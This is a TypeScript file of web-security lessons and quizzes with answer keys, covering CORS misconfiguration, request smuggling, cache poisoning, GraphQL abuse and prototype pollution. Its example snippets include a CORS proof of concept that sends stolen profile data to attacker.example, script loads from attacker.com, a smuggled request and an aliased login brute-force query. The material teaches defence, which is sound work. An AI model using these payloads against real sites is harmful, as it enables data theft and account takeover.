import type { Lesson } from "../types";

export const extraLessons: Lesson[] = [
  {
    id: "cors",
    title: "CORS Misconfigurations",
    summary: "Exploiting weak Cross-Origin Resource Sharing policies to steal sensitive user data.",
    cards: [
      {
        title: "The Reflection Trap",
        body: [
          "Cross-Origin Resource Sharing (CORS) is a security mechanism that allows web servers to state who can access their resources.",
          "A common mistake is a server that reads the `Origin` header from a request and reflects it back in `Access-Control-Allow-Origin`.",
          "If the server also sets `Access-Control-Allow-Credentials: true`, any website can make authenticated requests to the API and read the response."
        ],
        code: "HTTP/1.1 200 OK\nAccess-Control-Allow-Origin: https://attacker.example\nAccess-Control-Allow-Credentials: true",
        tone: "offense"
      },
      {
        title: "Trusting the Null Origin",
        body: [
          "The `null` origin is used in specific cases, like sandboxed iframes or local files.",
          "Some developers whitelist `null` in their CORS policy, thinking it is safe.",
          "An attacker can use a sandboxed iframe to generate a `null` origin request, bypassing the restriction and stealing data."
        ],
        code: "Origin: null\n\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: null\nAccess-Control-Allow-Credentials: true",
        tone: "offense"
      },
      {
        title: "CORS PoC: Data Theft",
        body: [
          "To exploit reflected CORS with credentials, an attacker hosts a script on their domain.",
          "The script uses `fetch` with `credentials: 'include'` to request sensitive data from the target API.",
          "Because the API reflects the attacker's origin, the browser allows the attacker's script to read the sensitive response."
        ],
        code: "fetch('https://api.target.com/user/profile', {\n  credentials: 'include'\n}).then(r => r.text()).then(data => {\n  fetch('https://attacker.example/log?data=' + btoa(data));\n});",
        tone: "offense"
      }
    ],
    exercises: [
      {
        type: "mc",
        q: "Why is reflecting the 'Origin' header back in 'Access-Control-Allow-Origin' dangerous when credentials are allowed?",
        options: [
          "It disables HTTPS for the connection",
          "It allows any site to read authenticated responses from the server",
          "It prevents the browser from sending cookies",
          "It makes the site vulnerable to SQL injection"
        ],
        answer: 1,
        explain: "When a server reflects the Origin header and sets credentials to true, it tells the browser that it trusts the requesting site with the user's session cookies.",
        hints: [
          "Think about the browser's Same-Origin Policy.",
          "Access-Control-Allow-Credentials allows cookies to be sent.",
          "The Origin header is controlled by the requester's domain."
        ]
      },
      {
        type: "order",
        q: "Order the steps an attacker takes to exploit a reflected CORS misconfiguration.",
        items: [
          "Identify an endpoint that reflects the Origin header with Allow-Credentials: true",
          "Host a malicious script on attacker.example",
          "Victim visits attacker.example while logged into target.com",
          "Malicious script fetches sensitive data from target.com using victim's cookies",
          "Script exfiltrates the stolen data to the attacker's server"
        ],
        explain: "The attack requires the victim to be authenticated and visit the attacker's site, which then triggers the cross-origin request.",
        hints: [
          "First, find the bug.",
          "Then, set up the landing page.",
          "The victim must visit the page for the exploit to trigger."
        ]
      },
      {
        type: "match",
        q: "Match the CORS header to its role in an exploit.",
        pairs: [
          ["Origin", "Sent by browser to identify the source domain"],
          ["Access-Control-Allow-Origin", "Specifies which domains can read the response"],
          ["Access-Control-Allow-Credentials", "Allows the request to include cookies/auth headers"],
          ["Vary: Origin", "Tells caches that the response depends on the Origin header"]
        ],
        explain: "These headers work together to define the cross-origin security boundary. Misconfiguring them breaks that boundary.",
        hints: [
          "Origin is a request header.",
          "Access-Control-* are response headers.",
          "Credentials refers to cookies."
        ]
      }
    ]
  },
  {
    id: "smuggling",
    title: "HTTP Request Smuggling",
    summary: "Desynchronizing front-end and back-end servers to 'smuggle' hidden requests.",
    cards: [
      {
        title: "The Desync Root Cause",
        body: [
          "HTTP Request Smuggling occurs when a front-end (proxy) and back-end server disagree on where a request ends.",
          "This usually happens when both `Content-Length` (CL) and `Transfer-Encoding` (TE) headers are present.",
          "If the front-end uses CL and the back-end uses TE, we call this a CL.TE vulnerability."
        ],
        code: "POST / HTTP/1.1\nHost: target.com\nContent-Length: 13\nTransfer-Encoding: chunked\n\n0\n\nSMUGGLED",
        tone: "offense"
      },
      {
        title: "CL.TE and TE.CL",
        body: [
          "In CL.TE, the front-end uses Content-Length to forward the whole request, but the back-end stops at the '0' chunk from Transfer-Encoding, leaving the rest in the buffer.",
          "In TE.CL, the front-end uses Transfer-Encoding, but the back-end uses Content-Length, stopping early and leaving a smuggled prefix for the next request.",
          "The 'smuggled' data becomes the start of the *next* user's request."
        ],
        tone: "offense"
      },
      {
        title: "Impact: Queue Poisoning",
        body: [
          "Request smuggling can lead to 'Request Queue Poisoning'.",
          "An attacker can smuggle a request that changes the next user's request to something else, like a request to a sensitive admin endpoint.",
          "This can also be used to hijack sessions by smuggling a request that appends the next user's request (including their cookies) to a comment field or log."
        ],
        tone: "offense"
      }
    ],
    exercises: [
      {
        type: "mc",
        q: "In a CL.TE attack, which header does the back-end server prioritize?",
        options: [
          "Content-Length",
          "Transfer-Encoding",
          "Host",
          "X-Forwarded-For"
        ],
        answer: 1,
        explain: "CL.TE means the Front-end uses Content-Length and the Back-end uses Transfer-Encoding.",
        hints: [
          "The acronym stands for [Front-end].[Back-end].",
          "The second part 'TE' refers to the Back-end."
        ]
      },
      {
        type: "fill",
        q: "In a chunked message, the end of the body is indicated by a chunk of size ____.",
        answers: ["0"],
        explain: "In Transfer-Encoding: chunked, a chunk with size 0 indicates the end of the transfer.",
        hints: [
          "It's a single digit.",
          "It represents zero remaining data."
        ]
      },
      {
        type: "match",
        q: "Match the smuggling technique to its description.",
        pairs: [
          ["CL.TE", "Front-end uses Content-Length, Back-end uses Transfer-Encoding"],
          ["TE.CL", "Front-end uses Transfer-Encoding, Back-end uses Content-Length"],
          ["TE.TE", "Both use TE, but one is obfuscated to make one server fall back to CL"],
          ["Queue Poisoning", "Affecting the next user's request in the connection pool"]
        ],
        explain: "These variations depend on which server supports which header and how they handle conflicts.",
        hints: [
          "CL stands for Content-Length.",
          "TE stands for Transfer-Encoding.",
          "TE.TE involves obfuscation."
        ]
      }
    ]
  },
  {
    id: "cache-poison",
    title: "Web Cache Poisoning",
    summary: "Manipulating caches to serve malicious content to other users.",
    cards: [
      {
        title: "Unkeyed Inputs",
        body: [
          "Caches use 'Cache Keys' (usually URL and Host header) to decide if they should serve a stored response.",
          "Unkeyed inputs are parts of the request that the cache ignores but the server uses to generate the page.",
          "Headers like `X-Forwarded-Host` or `X-Original-URL` are often unkeyed."
        ],
        code: "GET / HTTP/1.1\nHost: target.com\nX-Forwarded-Host: attacker.com\n\nHTTP/1.1 200 OK\n...\n<script src=\"https://attacker.com/script.js\">",
        tone: "offense"
      },
      {
        title: "Host-Header Poisoning",
        body: [
          "If a password reset email uses the `Host` header to generate a link, and the `Host` header is unkeyed, an attacker can poison the cache.",
          "The attacker sends a request with `Host: attacker.com`. The server generates a reset link pointing to the attacker.",
          "The cache stores this version. When a real user requests a reset, they get the link pointing to the attacker's server."
        ],
        tone: "offense"
      },
      {
        title: "Web Cache Deception",
        body: [
          "Cache Deception is different: it tricks the cache into storing sensitive *private* data in a *public* cache.",
          "An attacker tricks a user into visiting `/profile/;.css`. The server ignores the suffix and returns the profile, but the cache thinks it's a public CSS file and stores it.",
          "The attacker then visits the exact same URL to retrieve the cached profile data."
        ],
        tone: "offense"
      }
    ],
    exercises: [
      {
        type: "mc",
        q: "What is a 'Cache Key'?",
        options: [
          "A secret password for the admin panel",
          "A unique identifier used by a cache to look up a stored response",
          "An encrypted token in a cookie",
          "The private key used for TLS"
        ],
        answer: 1,
        explain: "The cache key is what the cache uses to determine if a new request matches a previously cached response.",
        hints: [
          "It's like a dictionary key for the cache storage.",
          "It usually includes the URL and Host header."
        ]
      },
      {
        type: "fill",
        q: "In Web Cache Deception, an attacker appends a static extension like .css to a URL containing ____ data.",
        answers: ["sensitive", "private", "user"],
        explain: "The goal is to make the cache think a dynamic, private page is actually a static, public asset.",
        hints: [
          "What kind of data are we trying to steal?",
          "The opposite of public."
        ]
      },
      {
        type: "match",
        q: "Match the term to its concept.",
        pairs: [
          ["Unkeyed Input", "Part of a request the cache ignores for its key"],
          ["Cache Poisoning", "Making the cache store a malicious response for all users"],
          ["Cache Deception", "Making the cache store one user's private data in a public path"],
          ["X-Forwarded-Host", "A common unkeyed header used for poisoning"]
        ],
        explain: "Poisoning affects everyone; Deception targets specific private data.",
        hints: [
          "Poisoning is about malicious content.",
          "Deception is about leaking private content.",
          "Unkeyed means not part of the key."
        ]
      }
    ]
  },
  {
    id: "graphql",
    title: "GraphQL Security",
    summary: "Exploiting the unique features of GraphQL APIs, from introspection to batching.",
    cards: [
      {
        title: "Introspection Queries",
        body: [
          "GraphQL allows clients to query the schema itself using `__schema` and `__type` fields. This is called Introspection.",
          "If enabled in production, an attacker can map the entire API, including hidden fields and administrative mutations.",
          "This is the first step in auditing any GraphQL endpoint."
        ],
        code: "query { __schema { queryType { fields { name } } } }",
        tone: "info"
      },
      {
        title: "Aliasing and Batching",
        body: [
          "GraphQL supports 'Aliasing', allowing multiple queries of the same type in one request.",
          "This can be used to bypass rate limits on things like login attempts. Instead of 100 requests, the attacker sends 1 request with 100 aliases.",
          "Batching (sending an array of queries) serves a similar purpose for exploitation."
        ],
        code: "query { \n  attempt1: login(user:\"admin\", pass:\"123\") { token }\n  attempt2: login(user:\"admin\", pass:\"456\") { token }\n}",
        tone: "offense"
      },
      {
        title: "Authorization on Mutations",
        body: [
          "Developers often focus on securing the `Query` type but forget `Mutation`.",
          "An attacker might find they can call `updateUser` or `deletePost` without proper permissions, even if the equivalent queries are protected.",
          "Always verify that every single resolver enforces proper authorization logic."
        ],
        tone: "defense"
      }
    ],
    exercises: [
      {
        type: "mc",
        q: "What does an 'Introspection Query' return?",
        options: [
          "The full database contents",
          "The structure and schema of the GraphQL API",
          "The server's environment variables",
          "A list of logged-in users"
        ],
        answer: 1,
        explain: "Introspection allows a client to ask the GraphQL server for information about its schema.",
        hints: [
          "It's a feature for self-discovery.",
          "It reveals types, queries, and mutations."
        ]
      },
      {
        type: "order",
        q: "Order the steps for a brute-force attack using GraphQL Aliasing.",
        items: [
          "Identify a login mutation through introspection",
          "Create a GraphQL query with hundreds of aliased calls to that mutation",
          "Send the single request to the server",
          "Check the response for a successful login token"
        ],
        explain: "Aliasing allows you to pack many operations into a single HTTP request, often bypassing per-request rate limits.",
        hints: [
          "First, find the target mutation.",
          "Then, prepare the multi-call payload.",
          "Analyze the results."
        ]
      },
      {
        type: "match",
        q: "Match the GraphQL concept to the security risk.",
        pairs: [
          ["Introspection", "Information disclosure of API schema"],
          ["Aliasing", "Rate limit bypass and brute forcing"],
          ["Deeply Nested Query", "Denial of Service (DoS) via resource exhaustion"],
          ["Mutations", "Unauthorized data modification"]
        ],
        explain: "Each feature of GraphQL, while useful for developers, presents a unique attack surface.",
        hints: [
          "Introspection is about knowing.",
          "Aliasing is about repeating.",
          "Nesting is about complexity."
        ]
      }
    ]
  },
  {
    id: "proto-pollution",
    title: "Prototype Pollution",
    summary: "Manipulating JavaScript prototypes to achieve DOM XSS and local privilege escalation.",
    cards: [
      {
        title: "The __proto__ Exploit",
        body: [
          "JavaScript objects inherit properties from prototypes. If an attacker can inject properties into `Object.prototype`, they 'pollute' all objects in the runtime.",
          "This often happens in recursive 'merge' or 'clone' functions that don't check for keys like `__proto__` or `constructor`.",
          "Polluting a property like `isAdmin` can lead to privilege escalation."
        ],
        code: "const user = JSON.parse('{\"__proto__\": {\"admin\": true}}');\nconst config = {};\nmerge(config, user);\nconsole.log({}.admin); // true",
        tone: "offense"
      },
      {
        title: "Pollution to DOM XSS",
        body: [
          "Prototype pollution is often used as a 'gadget' to trigger XSS.",
          "If a library uses an object to store config and later uses that config in a dangerous way (like `innerHTML`), we can pollute the config property.",
          "For example, polluting `Object.prototype.url` might force a script loader to fetch a malicious script."
        ],
        code: "// Vulnerable code\nvar options = window.config || {};\nif (options.transport_url) {\n  $.getScript(options.transport_url);\n}\n\n// Exploit via URL\n?__proto__[transport_url]=//attacker.com/xss.js",
        tone: "offense"
      },
      {
        title: "Finding the Source",
        body: [
          "Look for functions that parse user-controlled input into objects.",
          "Common culprits include URL query string parsers, JSON merging utilities, and configuration loaders.",
          "Prevention involves using `Object.create(null)` for plain objects, using `Map` instead of objects, or freezing the prototype."
        ],
        tone: "defense"
      }
    ],
    exercises: [
      {
        type: "mc",
        q: "Which property is most commonly used to reach the global Object prototype?",
        options: [
          "__proto__",
          "__parent__",
          "prototype",
          "__base__"
        ],
        answer: 0,
        explain: "The __proto__ property is a reference to the object's prototype, and polluting it affects all objects inheriting from that prototype.",
        hints: [
          "It starts and ends with double underscores.",
          "It's the standard way to access an object's prototype in JS."
        ]
      },
      {
        type: "fill",
        q: "To prevent prototype pollution, you can create an object that doesn't inherit from anything using Object.create(____).",
        answers: ["null"],
        explain: "Object.create(null) creates a 'pure' object with no prototype, making it immune to prototype pollution.",
        hints: [
          "What keyword represents 'nothing' in JavaScript?",
          "It's not undefined."
        ]
      },
      {
        type: "match",
        q: "Match the prototype pollution stage to its description.",
        pairs: [
          ["Source", "The point where user input enters the application (e.g. URL)"],
          ["Sink", "A dangerous function where the polluted property is used (e.g. innerHTML)"],
          ["Gadget", "Code that, when executed with a polluted property, performs an action"],
          ["Pollution", "The act of modifying Object.prototype"]
        ],
        explain: "Understanding the flow from source to pollution to sink is key to identifying and exploiting this bug.",
        hints: [
          "Source is the start.",
          "Sink is the end.",
          "Gadget is the tool in between."
        ]
      }
    ]
  }
];
